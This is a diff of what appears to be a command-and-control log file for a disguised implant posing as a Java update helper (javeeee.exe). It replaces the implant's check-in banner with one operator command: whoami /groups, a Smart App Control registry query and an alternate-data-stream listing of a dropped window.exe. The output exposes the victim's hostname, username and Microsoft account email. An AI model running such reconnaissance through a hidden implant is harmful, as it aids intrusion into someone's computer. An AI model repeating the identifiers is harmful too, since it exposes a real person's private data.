@@ -1,13 +1,46 @@
-Java Runtime Helper Online
-time=2026-08-28T13:30:12.9389089
-version=1.0.0
-host=DESKTOP-9ISASHE
-user=afzan
-pid=12860
-path=C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
-admin=false
-ssl=winhttp
-folder=hosts/DESKTOP-9ISASHE_afzan
-repo=duuniversity620/javadtin
-log=C:\Users\afzan\AppData\Local\Temp\javeeee_debug.log
-Waiting for commands...
+2026-08-28T13:30:15.3708255
+
+DESKTOP-9ISASHE / afzan
+
+C:\Users\afzan\AppData\Local\Oracle\JavaUpdate
+
+C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
+
+
+
+CMD[1/1] whoami /groups & echo ===SAC=== & reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v VerifiedAndReputablePolicyState & echo ===MOTW=== & cmd /c dir /r "C:\Users\Public\windir"
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID                                                                                                          Attributes                                        
+============================================================= ================ ============================================================================================================ ==================================================
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                                                                                                                    
+Everyone                                                      Well-known group S-1-1-0                                                                                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114                                                                                                    Group used for deny only                          
+BUILTIN\Administrators                                        Alias            S-1-5-32-544                                                                                                 Group used for deny only                          
+BUILTIN\Users                                                 Alias            S-1-5-32-545                                                                                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4                                                                                                      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                                                 Well-known group S-1-2-1                                                                                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11                                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15                                                                                                     Mandatory group, Enabled by default, Enabled group
+MicrosoftAccount\afzansh572@yahoo.com                         User             S-1-11-96-3623454863-58364-18864-2661722203-1597581903-2363766574-1535463773-2675977572-773651626-1675739227 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113                                                                                                    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Well-known group S-1-2-0                                                                                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Cloud Account Authentication                     Well-known group S-1-5-64-36                                                                                                  Mandatory group, Enabled by default, Enabled group
+===SAC=== 
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Policy
+    VerifiedAndReputablePolicyState    REG_DWORD    0x0
+
+===MOTW=== 
+ Volume in drive C has no label.
+ Volume Serial Number is 462B-F1A1
+
+ Directory of C:\Users\Public\windir
+
+08/28/2026  12:39 PM    <DIR>          .
+08/28/2026  12:39 PM    <DIR>          ..
+08/12/2026  10:04 AM           955,456 window.exe
+               1 File(s)        955,456 bytes
+               2 Dir(s)  151,607,087,104 bytes free
